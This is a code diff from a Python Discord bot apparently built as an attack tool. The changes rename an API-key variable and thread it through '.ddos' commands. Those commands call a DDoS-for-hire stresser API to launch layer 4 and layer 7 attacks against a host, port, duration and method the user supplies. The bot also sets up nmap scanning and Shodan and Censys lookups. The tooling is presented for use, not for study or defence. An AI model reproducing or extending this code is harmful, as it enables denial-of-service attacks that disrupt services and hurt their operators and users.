@@ -21,12 +21,13 @@ ctypes.windll.kernel32.SetConsoleTitleW("[Weeke's]->Discord Bot")
 
 token = ''
 SHODAN_API_KEY = ''
-API_URL = "https://censys.io/api/v1"
-api_id = ""
-api_secret = ""
+API_URL = 'https://censys.io/api/v1'
+api_id = ''
+api_secret = ''
 GITHUB_ACCESS_TOKEN = ''
-vulners_api_key = ""
+vulners_api_key = ''
 vt_api = ''
+stresser_ru_api_key = ''
 
 # setup scanner
 scanner = nmap.PortScanner()
@@ -290,7 +291,7 @@ ELITE       HTTP
     elif action == "get_running_attacks":
         print(f'[LOGS] Running Get Running Attacks command for ddos module.')
         action = "running"
-        params = {"key": api_key, "action": action}
+        params = {"key": stresser_ru_api_key, "action": action}
         try:
             response = requests.get(api_url, params=params)
             if response.status_code == 200:
@@ -307,10 +308,10 @@ ELITE       HTTP
     elif action == "launch_layer4_attack":
         if len(args) == 4:
             print(f'[LOGS] Running Layer 4 Attack.')
-            api_key, host, port, time, method = args
+            stresser_ru_api_key, host, port, time, method = args
             base_url = "https://stresse.ru/api/api.php"
             action = "layer4"
-            url = f"{base_url}?key={api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"
+            url = f"{base_url}?key={stresser_ru_api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"
 
             try:
                 response = requests.get(url)
@@ -325,7 +326,7 @@ ELITE       HTTP
             except Exception as e:
                 await ctx.send(f"Failed to connect to the API: {str(e)}")
         else:
-            await ctx.send("Usage: .ddos launch_layer4_attack <api_key> <host> <port> <time> <method>")
+            await ctx.send("Usage: .ddos launch_layer4_attack <stresser_ru_api_key> <host> <port> <time> <method>")
     elif action == "launch_layer7_attack":
         if len(args) >= 5:
             host, port, time, method, *extra_args = args
@@ -350,7 +351,7 @@ ELITE       HTTP
 
             api_url = "https://stresse.ru/api/api.php"
             params = {
-                "key": api_key,
+                "key": stresser_ru_api_key,
                 "action": "layer7",
                 "host": host,
                 "port": port,
